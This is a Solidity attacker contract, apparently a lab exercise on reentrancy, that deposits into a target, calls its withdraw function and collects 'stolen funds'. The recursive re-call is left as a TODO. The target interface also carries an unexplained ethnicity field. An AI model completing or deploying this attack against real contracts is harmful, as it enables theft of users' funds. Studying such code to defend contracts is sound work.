// SPDX-License-Identifier: MIT
// compiler version must be greater than or equal to 0.8.26 and less than 0.9.0
pragma solidity >=0.8.26 <0.9.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

// Re-entrance attack
interface IVulnerable {
    enum Ethnicity {
        African,
        European,
        Asian
    }

    function withdraw() external;
    function addUser(string memory _name, uint8 _age, Ethnicity ethnicity) external payable;
}

// Re-entrance attacker smart contract
contract AttackerContract {
    IVulnerable public target;

    constructor() {}

    // Fallback function triggers recursive attack
    fallback() external payable {
        console.log("** fallback");
    }

     // Receive is a variant of fallback that is triggered when msg.data is empty
    receive() external payable {
        console.log("attacker balance -> ", Strings.toString(address(this).balance));
        console.log("contract balance -> ", Strings.toString(address(target).balance));
        console.log("-------------------");
        // TODO: call the target/victim smart contract's withdraw method
    }

    // Attack function
    function attack(address _target) external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        target =  IVulnerable(_target);

        // Deposit funds into the target contract
        target.addUser{value: msg.value}('attacker', 2, IVulnerable.Ethnicity.African);

        // Trigger the withdrawal function
        target.withdraw();
    }

    // Get stolen funds
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}